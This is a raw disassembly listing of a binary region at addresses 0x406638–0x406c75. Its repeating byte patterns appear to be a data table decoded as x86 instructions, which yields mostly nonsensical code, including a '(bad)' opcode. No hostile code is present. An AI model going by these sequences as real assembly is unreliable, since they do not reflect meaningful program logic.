  406638:	00 00                	add    %al,(%eax)
  40663a:	03 03                	add    (%ebx),%eax
  40663c:	00 00                	add    %al,(%eax)
  40663e:	00 15 01 00 00 00    	add    %dl,0x1
  406644:	1c 1c                	sbb    $0x1c,%al
  406646:	00 00                	add    %al,(%eax)
  406648:	00 16                	add    %dl,(%esi)
  40664a:	17                   	pop    %ss
  40664b:	18 01                	sbb    %al,(%ecx)
  40664d:	00 00                	add    %al,(%eax)
  40664f:	00 83 83 00 00 00    	add    %al,0x83(%ebx)
  406655:	12 13                	adc    (%ebx),%dl
  406657:	0e                   	push   %cs
  406658:	00 00                	add    %al,(%eax)
  40665a:	00 07                	add    %al,(%edi)
  40665c:	07                   	pop    %es
  40665d:	00 00                	add    %al,(%eax)
  40665f:	00 01                	add    %al,(%ecx)
	...
  406669:	11 01                	adc    %eax,(%ecx)
  40666b:	00 00                	add    %al,(%eax)
  40666d:	00 1d 1d 00 00 00    	add    %bl,0x1d
  406673:	01 00                	add    %eax,(%eax)
  406675:	00 00                	add    %al,(%eax)
  406677:	eb eb                	jmp    0x406664
  406679:	00 00                	add    %al,(%eax)
  40667b:	00 01                	add    %al,(%ecx)
  40667d:	00 00                	add    %al,(%eax)
  40667f:	00 92 92 00 00 00    	add    %dl,0x92(%edx)
  406685:	12 13                	adc    (%ebx),%dl
  406687:	0e                   	push   %cs
  406688:	00 00                	add    %al,(%eax)
  40668a:	00 07                	add    %al,(%edi)
  40668c:	07                   	pop    %es
  40668d:	00 00                	add    %al,(%eax)
  40668f:	00 01                	add    %al,(%ecx)
	...
  406699:	11 01                	adc    %eax,(%ecx)
  40669b:	00 00                	add    %al,(%eax)
  40669d:	00 1e                	add    %bl,(%esi)
  40669f:	1e                   	push   %ds
  4066a0:	00 00                	add    %al,(%eax)
  4066a2:	00 14 00             	add    %dl,(%eax,%eax,1)
  4066a5:	00 00                	add    %al,(%eax)
  4066a7:	03 03                	add    (%ebx),%eax
  4066a9:	00 00                	add    %al,(%eax)
  4066ab:	00 15 01 00 00 00    	add    %dl,0x1
  4066b1:	1e                   	push   %ds
  4066b2:	1e                   	push   %ds
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 16                	add    %dl,(%esi)
  4066b7:	17                   	pop    %ss
  4066b8:	18 01                	sbb    %al,(%ecx)
  4066ba:	00 00                	add    %al,(%eax)
  4066bc:	00 ff                	add    %bh,%bh
  4066be:	ff 00                	incl   (%eax)
  4066c0:	00 00                	add    %al,(%eax)
  4066c2:	12 13                	adc    (%ebx),%dl
  4066c4:	0e                   	push   %cs
  4066c5:	00 00                	add    %al,(%eax)
  4066c7:	00 07                	add    %al,(%edi)
  4066c9:	07                   	pop    %es
  4066ca:	00 00                	add    %al,(%eax)
  4066cc:	00 01                	add    %al,(%ecx)
	...
  4066d6:	11 01                	adc    %eax,(%ecx)
  4066d8:	00 00                	add    %al,(%eax)
  4066da:	00 1f                	add    %bl,(%edi)
  4066dc:	1f                   	pop    %ds
  4066dd:	00 00                	add    %al,(%eax)
  4066df:	00 01                	add    %al,(%ecx)
  4066e1:	00 00                	add    %al,(%eax)
  4066e3:	00 50 50             	add    %dl,0x50(%eax)
  4066e6:	00 00                	add    %al,(%eax)
  4066e8:	00 01                	add    %al,(%ecx)
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 34 34             	add    %dh,(%esp,%esi,1)
  4066ef:	00 00                	add    %al,(%eax)
  4066f1:	00 12                	add    %dl,(%edx)
  4066f3:	13 0e                	adc    (%esi),%ecx
  4066f5:	00 00                	add    %al,(%eax)
  4066f7:	00 07                	add    %al,(%edi)
  4066f9:	07                   	pop    %es
  4066fa:	00 00                	add    %al,(%eax)
  4066fc:	00 01                	add    %al,(%ecx)
	...
  406706:	11 01                	adc    %eax,(%ecx)
  406708:	00 00                	add    %al,(%eax)
  40670a:	00 20                	add    %ah,(%eax)
  40670c:	20 00                	and    %al,(%eax)
  40670e:	00 00                	add    %al,(%eax)
  406710:	01 00                	add    %eax,(%eax)
  406712:	00 00                	add    %al,(%eax)
  406714:	9a 9a 00 00 00 01 00 	lcall  $0x1,$0x9a
  40671b:	00 00                	add    %al,(%eax)
  40671d:	ff                   	(bad)
  40671e:	ff 00                	incl   (%eax)
  406720:	00 00                	add    %al,(%eax)
  406722:	12 13                	adc    (%ebx),%dl
  406724:	0e                   	push   %cs
  406725:	00 00                	add    %al,(%eax)
  406727:	00 07                	add    %al,(%edi)
  406729:	07                   	pop    %es
  40672a:	00 00                	add    %al,(%eax)
  40672c:	00 01                	add    %al,(%ecx)
	...
  406736:	11 01                	adc    %eax,(%ecx)
  406738:	00 00                	add    %al,(%eax)
  40673a:	00 21                	add    %ah,(%ecx)
  40673c:	21 00                	and    %eax,(%eax)
  40673e:	00 00                	add    %al,(%eax)
  406740:	14 00                	adc    $0x0,%al
  406742:	00 00                	add    %al,(%eax)
  406744:	03 03                	add    (%ebx),%eax
  406746:	00 00                	add    %al,(%eax)
  406748:	00 15 01 00 00 00    	add    %dl,0x1
  40674e:	21 21                	and    %esp,(%ecx)
  406750:	00 00                	add    %al,(%eax)
  406752:	00 16                	add    %dl,(%esi)
  406754:	17                   	pop    %ss
  406755:	18 01                	sbb    %al,(%ecx)
  406757:	00 00                	add    %al,(%eax)
  406759:	00 08                	add    %cl,(%eax)
  40675b:	08 00                	or     %al,(%eax)
  40675d:	00 00                	add    %al,(%eax)
  40675f:	12 13                	adc    (%ebx),%dl
  406761:	0e                   	push   %cs
  406762:	00 00                	add    %al,(%eax)
  406764:	00 07                	add    %al,(%edi)
  406766:	07                   	pop    %es
  406767:	00 00                	add    %al,(%eax)
  406769:	00 01                	add    %al,(%ecx)
	...
  406773:	11 01                	adc    %eax,(%ecx)
  406775:	00 00                	add    %al,(%eax)
  406777:	00 22                	add    %ah,(%edx)
  406779:	22 00                	and    (%eax),%al
  40677b:	00 00                	add    %al,(%eax)
  40677d:	01 00                	add    %eax,(%eax)
  40677f:	00 00                	add    %al,(%eax)
  406781:	ef                   	out    %eax,(%dx)
  406782:	ef                   	out    %eax,(%dx)
  406783:	00 00                	add    %al,(%eax)
  406785:	00 01                	add    %al,(%ecx)
  406787:	00 00                	add    %al,(%eax)
  406789:	00 80 80 00 00 00    	add    %al,0x80(%eax)
  40678f:	12 13                	adc    (%ebx),%dl
  406791:	0e                   	push   %cs
  406792:	00 00                	add    %al,(%eax)
  406794:	00 07                	add    %al,(%edi)
  406796:	07                   	pop    %es
  406797:	00 00                	add    %al,(%eax)
  406799:	00 01                	add    %al,(%ecx)
	...
  4067a3:	11 01                	adc    %eax,(%ecx)
  4067a5:	00 00                	add    %al,(%eax)
  4067a7:	00 23                	add    %ah,(%ebx)
  4067a9:	23 00                	and    (%eax),%eax
  4067ab:	00 00                	add    %al,(%eax)
  4067ad:	01 00                	add    %eax,(%eax)
  4067af:	00 00                	add    %al,(%eax)
  4067b1:	ac                   	lods   %ds:(%esi),%al
  4067b2:	ac                   	lods   %ds:(%esi),%al
  4067b3:	00 00                	add    %al,(%eax)
  4067b5:	00 01                	add    %al,(%ecx)
  4067b7:	00 00                	add    %al,(%eax)
  4067b9:	00 8c 8c 00 00 00 12 	add    %cl,0x12000000(%esp,%ecx,4)
  4067c0:	13 0e                	adc    (%esi),%ecx
  4067c2:	00 00                	add    %al,(%eax)
  4067c4:	00 07                	add    %al,(%edi)
  4067c6:	07                   	pop    %es
  4067c7:	00 00                	add    %al,(%eax)
  4067c9:	00 01                	add    %al,(%ecx)
	...
  4067d3:	11 01                	adc    %eax,(%ecx)
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	00 24 24             	add    %ah,(%esp)
  4067da:	00 00                	add    %al,(%eax)
  4067dc:	00 01                	add    %al,(%ecx)
  4067de:	00 00                	add    %al,(%eax)
  4067e0:	00 c6                	add    %al,%dh
  4067e2:	c6 00 00             	movb   $0x0,(%eax)
  4067e5:	00 01                	add    %al,(%ecx)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 b0 b0 00 00 00    	add    %dh,0xb0(%eax)
  4067ef:	12 13                	adc    (%ebx),%dl
  4067f1:	0e                   	push   %cs
  4067f2:	00 00                	add    %al,(%eax)
  4067f4:	00 07                	add    %al,(%edi)
  4067f6:	07                   	pop    %es
  4067f7:	00 00                	add    %al,(%eax)
  4067f9:	00 01                	add    %al,(%ecx)
	...
  406803:	11 01                	adc    %eax,(%ecx)
  406805:	00 00                	add    %al,(%eax)
  406807:	00 25 25 00 00 00    	add    %ah,0x25
  40680d:	14 00                	adc    $0x0,%al
  40680f:	00 00                	add    %al,(%eax)
  406811:	03 03                	add    (%ebx),%eax
  406813:	00 00                	add    %al,(%eax)
  406815:	00 15 01 00 00 00    	add    %dl,0x1
  40681b:	25 25 00 00 00       	and    $0x25,%eax
  406820:	16                   	push   %ss
  406821:	17                   	pop    %ss
  406822:	18 01                	sbb    %al,(%ecx)
  406824:	00 00                	add    %al,(%eax)
  406826:	00 c1                	add    %al,%cl
  406828:	c1 00 00             	roll   $0x0,(%eax)
  40682b:	00 12                	add    %dl,(%edx)
  40682d:	13 0e                	adc    (%esi),%ecx
  40682f:	00 00                	add    %al,(%eax)
  406831:	00 07                	add    %al,(%edi)
  406833:	07                   	pop    %es
  406834:	00 00                	add    %al,(%eax)
  406836:	00 01                	add    %al,(%ecx)
	...
  406840:	11 01                	adc    %eax,(%ecx)
  406842:	00 00                	add    %al,(%eax)
  406844:	00 26                	add    %ah,(%esi)
  406846:	26 00 00             	add    %al,%es:(%eax)
  406849:	00 01                	add    %al,(%ecx)
  40684b:	00 00                	add    %al,(%eax)
  40684d:	00 26                	add    %ah,(%esi)
  40684f:	26 00 00             	add    %al,%es:(%eax)
  406852:	00 01                	add    %al,(%ecx)
  406854:	00 00                	add    %al,(%eax)
  406856:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40685a:	00 00                	add    %al,(%eax)
  40685c:	12 13                	adc    (%ebx),%dl
  40685e:	0e                   	push   %cs
  40685f:	00 00                	add    %al,(%eax)
  406861:	00 07                	add    %al,(%edi)
  406863:	07                   	pop    %es
  406864:	00 00                	add    %al,(%eax)
  406866:	00 01                	add    %al,(%ecx)
	...
  406870:	11 01                	adc    %eax,(%ecx)
  406872:	00 00                	add    %al,(%eax)
  406874:	00 27                	add    %ah,(%edi)
  406876:	27                   	daa
  406877:	00 00                	add    %al,(%eax)
  406879:	00 14 00             	add    %dl,(%eax,%eax,1)
  40687c:	00 00                	add    %al,(%eax)
  40687e:	03 03                	add    (%ebx),%eax
  406880:	00 00                	add    %al,(%eax)
  406882:	00 15 01 00 00 00    	add    %dl,0x1
  406888:	27                   	daa
  406889:	27                   	daa
  40688a:	00 00                	add    %al,(%eax)
  40688c:	00 16                	add    %dl,(%esi)
  40688e:	17                   	pop    %ss
  40688f:	18 01                	sbb    %al,(%ecx)
  406891:	00 00                	add    %al,(%eax)
  406893:	00 bf bf 00 00 00    	add    %bh,0xbf(%edi)
  406899:	12 13                	adc    (%ebx),%dl
  40689b:	0e                   	push   %cs
  40689c:	00 00                	add    %al,(%eax)
  40689e:	00 07                	add    %al,(%edi)
  4068a0:	07                   	pop    %es
  4068a1:	00 00                	add    %al,(%eax)
  4068a3:	00 01                	add    %al,(%ecx)
	...
  4068ad:	11 01                	adc    %eax,(%ecx)
  4068af:	00 00                	add    %al,(%eax)
  4068b1:	00 28                	add    %ch,(%eax)
  4068b3:	28 00                	sub    %al,(%eax)
  4068b5:	00 00                	add    %al,(%eax)
  4068b7:	14 00                	adc    $0x0,%al
  4068b9:	00 00                	add    %al,(%eax)
  4068bb:	03 03                	add    (%ebx),%eax
  4068bd:	00 00                	add    %al,(%eax)
  4068bf:	00 15 01 00 00 00    	add    %dl,0x1
  4068c5:	28 28                	sub    %ch,(%eax)
  4068c7:	00 00                	add    %al,(%eax)
  4068c9:	00 16                	add    %dl,(%esi)
  4068cb:	17                   	pop    %ss
  4068cc:	18 01                	sbb    %al,(%ecx)
  4068ce:	00 00                	add    %al,(%eax)
  4068d0:	00 33                	add    %dh,(%ebx)
  4068d2:	33 00                	xor    (%eax),%eax
  4068d4:	00 00                	add    %al,(%eax)
  4068d6:	12 13                	adc    (%ebx),%dl
  4068d8:	0e                   	push   %cs
  4068d9:	00 00                	add    %al,(%eax)
  4068db:	00 07                	add    %al,(%edi)
  4068dd:	07                   	pop    %es
  4068de:	00 00                	add    %al,(%eax)
  4068e0:	00 01                	add    %al,(%ecx)
	...
  4068ea:	11 01                	adc    %eax,(%ecx)
  4068ec:	00 00                	add    %al,(%eax)
  4068ee:	00 29                	add    %ch,(%ecx)
  4068f0:	29 00                	sub    %eax,(%eax)
  4068f2:	00 00                	add    %al,(%eax)
  4068f4:	01 00                	add    %eax,(%eax)
  4068f6:	00 00                	add    %al,(%eax)
  4068f8:	33 33                	xor    (%ebx),%esi
  4068fa:	00 00                	add    %al,(%eax)
  4068fc:	00 01                	add    %al,(%ecx)
  4068fe:	00 00                	add    %al,(%eax)
  406900:	00 5c 5c 00          	add    %bl,0x0(%esp,%ebx,2)
  406904:	00 00                	add    %al,(%eax)
  406906:	12 13                	adc    (%ebx),%dl
  406908:	0e                   	push   %cs
  406909:	00 00                	add    %al,(%eax)
  40690b:	00 07                	add    %al,(%edi)
  40690d:	07                   	pop    %es
  40690e:	00 00                	add    %al,(%eax)
  406910:	00 01                	add    %al,(%ecx)
	...
  40691a:	11 01                	adc    %eax,(%ecx)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	00 2a                	add    %ch,(%edx)
  406920:	2a 00                	sub    (%eax),%al
  406922:	00 00                	add    %al,(%eax)
  406924:	14 00                	adc    $0x0,%al
  406926:	00 00                	add    %al,(%eax)
  406928:	03 03                	add    (%ebx),%eax
  40692a:	00 00                	add    %al,(%eax)
  40692c:	00 15 01 00 00 00    	add    %dl,0x1
  406932:	2a 2a                	sub    (%edx),%ch
  406934:	00 00                	add    %al,(%eax)
  406936:	00 16                	add    %dl,(%esi)
  406938:	17                   	pop    %ss
  406939:	18 01                	sbb    %al,(%ecx)
  40693b:	00 00                	add    %al,(%eax)
  40693d:	00 d0                	add    %dl,%al
  40693f:	d0 00                	rolb   $1,(%eax)
  406941:	00 00                	add    %al,(%eax)
  406943:	12 13                	adc    (%ebx),%dl
  406945:	0e                   	push   %cs
  406946:	00 00                	add    %al,(%eax)
  406948:	00 07                	add    %al,(%edi)
  40694a:	07                   	pop    %es
  40694b:	00 00                	add    %al,(%eax)
  40694d:	00 01                	add    %al,(%ecx)
	...
  406957:	11 01                	adc    %eax,(%ecx)
  406959:	00 00                	add    %al,(%eax)
  40695b:	00 2b                	add    %ch,(%ebx)
  40695d:	2b 00                	sub    (%eax),%eax
  40695f:	00 00                	add    %al,(%eax)
  406961:	14 00                	adc    $0x0,%al
  406963:	00 00                	add    %al,(%eax)
  406965:	03 03                	add    (%ebx),%eax
  406967:	00 00                	add    %al,(%eax)
  406969:	00 15 01 00 00 00    	add    %dl,0x1
  40696f:	2b 2b                	sub    (%ebx),%ebp
  406971:	00 00                	add    %al,(%eax)
  406973:	00 16                	add    %dl,(%esi)
  406975:	17                   	pop    %ss
  406976:	18 01                	sbb    %al,(%ecx)
  406978:	00 00                	add    %al,(%eax)
  40697a:	00 b5 b5 00 00 00    	add    %dh,0xb5(%ebp)
  406980:	12 13                	adc    (%ebx),%dl
  406982:	0e                   	push   %cs
  406983:	00 00                	add    %al,(%eax)
  406985:	00 07                	add    %al,(%edi)
  406987:	07                   	pop    %es
  406988:	00 00                	add    %al,(%eax)
  40698a:	00 01                	add    %al,(%ecx)
	...
  406994:	11 01                	adc    %eax,(%ecx)
  406996:	00 00                	add    %al,(%eax)
  406998:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  40699b:	00 00                	add    %al,(%eax)
  40699d:	00 14 00             	add    %dl,(%eax,%eax,1)
  4069a0:	00 00                	add    %al,(%eax)
  4069a2:	03 03                	add    (%ebx),%eax
  4069a4:	00 00                	add    %al,(%eax)
  4069a6:	00 15 01 00 00 00    	add    %dl,0x1
  4069ac:	2c 2c                	sub    $0x2c,%al
  4069ae:	00 00                	add    %al,(%eax)
  4069b0:	00 16                	add    %dl,(%esi)
  4069b2:	17                   	pop    %ss
  4069b3:	18 01                	sbb    %al,(%ecx)
  4069b5:	00 00                	add    %al,(%eax)
  4069b7:	00 52 52             	add    %dl,0x52(%edx)
  4069ba:	00 00                	add    %al,(%eax)
  4069bc:	00 12                	add    %dl,(%edx)
  4069be:	13 0e                	adc    (%esi),%ecx
  4069c0:	00 00                	add    %al,(%eax)
  4069c2:	00 07                	add    %al,(%edi)
  4069c4:	07                   	pop    %es
  4069c5:	00 00                	add    %al,(%eax)
  4069c7:	00 01                	add    %al,(%ecx)
	...
  4069d1:	11 01                	adc    %eax,(%ecx)
  4069d3:	00 00                	add    %al,(%eax)
  4069d5:	00 2d 2d 00 00 00    	add    %ch,0x2d
  4069db:	01 00                	add    %eax,(%eax)
  4069dd:	00 00                	add    %al,(%eax)
  4069df:	52                   	push   %edx
  4069e0:	52                   	push   %edx
  4069e1:	00 00                	add    %al,(%eax)
  4069e3:	00 01                	add    %al,(%ecx)
  4069e5:	00 00                	add    %al,(%eax)
  4069e7:	00 34 34             	add    %dh,(%esp,%esi,1)
  4069ea:	00 00                	add    %al,(%eax)
  4069ec:	00 12                	add    %dl,(%edx)
  4069ee:	13 0e                	adc    (%esi),%ecx
  4069f0:	00 00                	add    %al,(%eax)
  4069f2:	00 07                	add    %al,(%edi)
  4069f4:	07                   	pop    %es
  4069f5:	00 00                	add    %al,(%eax)
  4069f7:	00 01                	add    %al,(%ecx)
	...
  406a01:	11 01                	adc    %eax,(%ecx)
  406a03:	00 00                	add    %al,(%eax)
  406a05:	00 2e                	add    %ch,(%esi)
  406a07:	2e 00 00             	add    %al,%cs:(%eax)
  406a0a:	00 14 00             	add    %dl,(%eax,%eax,1)
  406a0d:	00 00                	add    %al,(%eax)
  406a0f:	03 03                	add    (%ebx),%eax
  406a11:	00 00                	add    %al,(%eax)
  406a13:	00 15 01 00 00 00    	add    %dl,0x1
  406a19:	2e 2e 00 00          	cs add %al,%cs:(%eax)
  406a1d:	00 16                	add    %dl,(%esi)
  406a1f:	17                   	pop    %ss
  406a20:	18 01                	sbb    %al,(%ecx)
  406a22:	00 00                	add    %al,(%eax)
  406a24:	00 8f 8f 00 00 00    	add    %cl,0x8f(%edi)
  406a2a:	12 13                	adc    (%ebx),%dl
  406a2c:	0e                   	push   %cs
  406a2d:	00 00                	add    %al,(%eax)
  406a2f:	00 07                	add    %al,(%edi)
  406a31:	07                   	pop    %es
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 01                	add    %al,(%ecx)
	...
  406a3e:	11 01                	adc    %eax,(%ecx)
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 2f                	add    %ch,(%edi)
  406a44:	2f                   	das
  406a45:	00 00                	add    %al,(%eax)
  406a47:	00 01                	add    %al,(%ecx)
  406a49:	00 00                	add    %al,(%eax)
  406a4b:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  406a4e:	00 00                	add    %al,(%eax)
  406a50:	00 01                	add    %al,(%ecx)
  406a52:	00 00                	add    %al,(%eax)
  406a54:	00 5d 5d             	add    %bl,0x5d(%ebp)
  406a57:	00 00                	add    %al,(%eax)
  406a59:	00 12                	add    %dl,(%edx)
  406a5b:	13 0e                	adc    (%esi),%ecx
  406a5d:	00 00                	add    %al,(%eax)
  406a5f:	00 07                	add    %al,(%edi)
  406a61:	07                   	pop    %es
  406a62:	00 00                	add    %al,(%eax)
  406a64:	00 01                	add    %al,(%ecx)
	...
  406a6e:	11 01                	adc    %eax,(%ecx)
  406a70:	00 00                	add    %al,(%eax)
  406a72:	00 30                	add    %dh,(%eax)
  406a74:	30 00                	xor    %al,(%eax)
  406a76:	00 00                	add    %al,(%eax)
  406a78:	14 00                	adc    $0x0,%al
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	03 03                	add    (%ebx),%eax
  406a7e:	00 00                	add    %al,(%eax)
  406a80:	00 15 01 00 00 00    	add    %dl,0x1
  406a86:	30 30                	xor    %dh,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	00 16                	add    %dl,(%esi)
  406a8c:	17                   	pop    %ss
  406a8d:	18 01                	sbb    %al,(%ecx)
  406a8f:	00 00                	add    %al,(%eax)
  406a91:	00 c1                	add    %al,%cl
  406a93:	c1 00 00             	roll   $0x0,(%eax)
  406a96:	00 12                	add    %dl,(%edx)
  406a98:	13 0e                	adc    (%esi),%ecx
  406a9a:	00 00                	add    %al,(%eax)
  406a9c:	00 07                	add    %al,(%edi)
  406a9e:	07                   	pop    %es
  406a9f:	00 00                	add    %al,(%eax)
  406aa1:	00 01                	add    %al,(%ecx)
	...
  406aab:	11 01                	adc    %eax,(%ecx)
  406aad:	00 00                	add    %al,(%eax)
  406aaf:	00 31                	add    %dh,(%ecx)
  406ab1:	31 00                	xor    %eax,(%eax)
  406ab3:	00 00                	add    %al,(%eax)
  406ab5:	01 00                	add    %eax,(%eax)
  406ab7:	00 00                	add    %al,(%eax)
  406ab9:	56                   	push   %esi
  406aba:	56                   	push   %esi
  406abb:	00 00                	add    %al,(%eax)
  406abd:	00 01                	add    %al,(%ecx)
  406abf:	00 00                	add    %al,(%eax)
  406ac1:	00 3b                	add    %bh,(%ebx)
  406ac3:	3b 00                	cmp    (%eax),%eax
  406ac5:	00 00                	add    %al,(%eax)
  406ac7:	12 13                	adc    (%ebx),%dl
  406ac9:	0e                   	push   %cs
  406aca:	00 00                	add    %al,(%eax)
  406acc:	00 07                	add    %al,(%edi)
  406ace:	07                   	pop    %es
  406acf:	00 00                	add    %al,(%eax)
  406ad1:	00 01                	add    %al,(%ecx)
	...
  406adb:	11 01                	adc    %eax,(%ecx)
  406add:	00 00                	add    %al,(%eax)
  406adf:	00 32                	add    %dh,(%edx)
  406ae1:	32 00                	xor    (%eax),%al
  406ae3:	00 00                	add    %al,(%eax)
  406ae5:	01 00                	add    %eax,(%eax)
  406ae7:	00 00                	add    %al,(%eax)
  406ae9:	1b 1b                	sbb    (%ebx),%ebx
  406aeb:	00 00                	add    %al,(%eax)
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 00                	add    %al,(%eax)
  406af1:	00 5f 5f             	add    %bl,0x5f(%edi)
  406af4:	00 00                	add    %al,(%eax)
  406af6:	00 12                	add    %dl,(%edx)
  406af8:	13 0e                	adc    (%esi),%ecx
  406afa:	00 00                	add    %al,(%eax)
  406afc:	00 07                	add    %al,(%edi)
  406afe:	07                   	pop    %es
  406aff:	00 00                	add    %al,(%eax)
  406b01:	00 01                	add    %al,(%ecx)
	...
  406b0b:	11 01                	adc    %eax,(%ecx)
  406b0d:	00 00                	add    %al,(%eax)
  406b0f:	00 33                	add    %dh,(%ebx)
  406b11:	33 00                	xor    (%eax),%eax
  406b13:	00 00                	add    %al,(%eax)
  406b15:	14 00                	adc    $0x0,%al
  406b17:	00 00                	add    %al,(%eax)
  406b19:	03 03                	add    (%ebx),%eax
  406b1b:	00 00                	add    %al,(%eax)
  406b1d:	00 15 01 00 00 00    	add    %dl,0x1
  406b23:	33 33                	xor    (%ebx),%esi
  406b25:	00 00                	add    %al,(%eax)
  406b27:	00 16                	add    %dl,(%esi)
  406b29:	17                   	pop    %ss
  406b2a:	18 01                	sbb    %al,(%ecx)
  406b2c:	00 00                	add    %al,(%eax)
  406b2e:	00 1a                	add    %bl,(%edx)
  406b30:	1a 00                	sbb    (%eax),%al
  406b32:	00 00                	add    %al,(%eax)
  406b34:	12 13                	adc    (%ebx),%dl
  406b36:	0e                   	push   %cs
  406b37:	00 00                	add    %al,(%eax)
  406b39:	00 07                	add    %al,(%edi)
  406b3b:	07                   	pop    %es
  406b3c:	00 00                	add    %al,(%eax)
  406b3e:	00 01                	add    %al,(%ecx)
	...
  406b48:	11 01                	adc    %eax,(%ecx)
  406b4a:	00 00                	add    %al,(%eax)
  406b4c:	00 34 34             	add    %dh,(%esp,%esi,1)
  406b4f:	00 00                	add    %al,(%eax)
  406b51:	00 14 00             	add    %dl,(%eax,%eax,1)
  406b54:	00 00                	add    %al,(%eax)
  406b56:	03 03                	add    (%ebx),%eax
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	00 15 01 00 00 00    	add    %dl,0x1
  406b60:	34 34                	xor    $0x34,%al
  406b62:	00 00                	add    %al,(%eax)
  406b64:	00 16                	add    %dl,(%esi)
  406b66:	17                   	pop    %ss
  406b67:	18 01                	sbb    %al,(%ecx)
  406b69:	00 00                	add    %al,(%eax)
  406b6b:	00 cc                	add    %cl,%ah
  406b6d:	cc                   	int3
  406b6e:	00 00                	add    %al,(%eax)
  406b70:	00 12                	add    %dl,(%edx)
  406b72:	13 0e                	adc    (%esi),%ecx
  406b74:	00 00                	add    %al,(%eax)
  406b76:	00 07                	add    %al,(%edi)
  406b78:	07                   	pop    %es
  406b79:	00 00                	add    %al,(%eax)
  406b7b:	00 01                	add    %al,(%ecx)
	...
  406b85:	11 01                	adc    %eax,(%ecx)
  406b87:	00 00                	add    %al,(%eax)
  406b89:	00 35 35 00 00 00    	add    %dh,0x35
  406b8f:	01 00                	add    %eax,(%eax)
  406b91:	00 00                	add    %al,(%eax)
  406b93:	4d                   	dec    %ebp
  406b94:	4d                   	dec    %ebp
  406b95:	00 00                	add    %al,(%eax)
  406b97:	00 01                	add    %al,(%ecx)
  406b99:	00 00                	add    %al,(%eax)
  406b9b:	00 6d 6d             	add    %ch,0x6d(%ebp)
  406b9e:	00 00                	add    %al,(%eax)
  406ba0:	00 12                	add    %dl,(%edx)
  406ba2:	13 0e                	adc    (%esi),%ecx
  406ba4:	00 00                	add    %al,(%eax)
  406ba6:	00 07                	add    %al,(%edi)
  406ba8:	07                   	pop    %es
  406ba9:	00 00                	add    %al,(%eax)
  406bab:	00 01                	add    %al,(%ecx)
	...
  406bb5:	11 01                	adc    %eax,(%ecx)
  406bb7:	00 00                	add    %al,(%eax)
  406bb9:	00 36                	add    %dh,(%esi)
  406bbb:	36 00 00             	add    %al,%ss:(%eax)
  406bbe:	00 01                	add    %al,(%ecx)
  406bc0:	00 00                	add    %al,(%eax)
  406bc2:	00 3f                	add    %bh,(%edi)
  406bc4:	3f                   	aas
  406bc5:	00 00                	add    %al,(%eax)
  406bc7:	00 01                	add    %al,(%ecx)
  406bc9:	00 00                	add    %al,(%eax)
  406bcb:	00 52 52             	add    %dl,0x52(%edx)
  406bce:	00 00                	add    %al,(%eax)
  406bd0:	00 12                	add    %dl,(%edx)
  406bd2:	13 0e                	adc    (%esi),%ecx
  406bd4:	00 00                	add    %al,(%eax)
  406bd6:	00 07                	add    %al,(%edi)
  406bd8:	07                   	pop    %es
  406bd9:	00 00                	add    %al,(%eax)
  406bdb:	00 01                	add    %al,(%ecx)
	...
  406be5:	11 01                	adc    %eax,(%ecx)
  406be7:	00 00                	add    %al,(%eax)
  406be9:	00 37                	add    %dh,(%edi)
  406beb:	37                   	aaa
  406bec:	00 00                	add    %al,(%eax)
  406bee:	00 01                	add    %al,(%ecx)
  406bf0:	00 00                	add    %al,(%eax)
  406bf2:	00 36                	add    %dh,(%esi)
  406bf4:	36 00 00             	add    %al,%ss:(%eax)
  406bf7:	00 01                	add    %al,(%ecx)
  406bf9:	00 00                	add    %al,(%eax)
  406bfb:	00 59 59             	add    %bl,0x59(%ecx)
  406bfe:	00 00                	add    %al,(%eax)
  406c00:	00 12                	add    %dl,(%edx)
  406c02:	13 0e                	adc    (%esi),%ecx
  406c04:	00 00                	add    %al,(%eax)
  406c06:	00 07                	add    %al,(%edi)
  406c08:	07                   	pop    %es
  406c09:	00 00                	add    %al,(%eax)
  406c0b:	00 01                	add    %al,(%ecx)
	...
  406c15:	11 01                	adc    %eax,(%ecx)
  406c17:	00 00                	add    %al,(%eax)
  406c19:	00 38                	add    %bh,(%eax)
  406c1b:	38 00                	cmp    %al,(%eax)
  406c1d:	00 00                	add    %al,(%eax)
  406c1f:	14 00                	adc    $0x0,%al
  406c21:	00 00                	add    %al,(%eax)
  406c23:	03 03                	add    (%ebx),%eax
  406c25:	00 00                	add    %al,(%eax)
  406c27:	00 15 01 00 00 00    	add    %dl,0x1
  406c2d:	38 38                	cmp    %bh,(%eax)
  406c2f:	00 00                	add    %al,(%eax)
  406c31:	00 16                	add    %dl,(%esi)
  406c33:	17                   	pop    %ss
  406c34:	18 01                	sbb    %al,(%ecx)
  406c36:	00 00                	add    %al,(%eax)
  406c38:	00 95 95 00 00 00    	add    %dl,0x95(%ebp)
  406c3e:	12 13                	adc    (%ebx),%dl
  406c40:	0e                   	push   %cs
  406c41:	00 00                	add    %al,(%eax)
  406c43:	00 07                	add    %al,(%edi)
  406c45:	07                   	pop    %es
  406c46:	00 00                	add    %al,(%eax)
  406c48:	00 01                	add    %al,(%ecx)
	...
  406c52:	11 01                	adc    %eax,(%ecx)
  406c54:	00 00                	add    %al,(%eax)
  406c56:	00 39                	add    %bh,(%ecx)
  406c58:	39 00                	cmp    %eax,(%eax)
  406c5a:	00 00                	add    %al,(%eax)
  406c5c:	14 00                	adc    $0x0,%al
  406c5e:	00 00                	add    %al,(%eax)
  406c60:	03 03                	add    (%ebx),%eax
  406c62:	00 00                	add    %al,(%eax)
  406c64:	00 15 01 00 00 00    	add    %dl,0x1
  406c6a:	39 39                	cmp    %edi,(%ecx)
  406c6c:	00 00                	add    %al,(%eax)
  406c6e:	00 16                	add    %dl,(%esi)
  406c70:	17                   	pop    %ss
  406c71:	18 01                	sbb    %al,(%ecx)
  406c73:	00 00                	add    %al,(%eax)
  406c75:	00 a5 a5 00 00 00    	add    %ah,0xa5(%ebp)
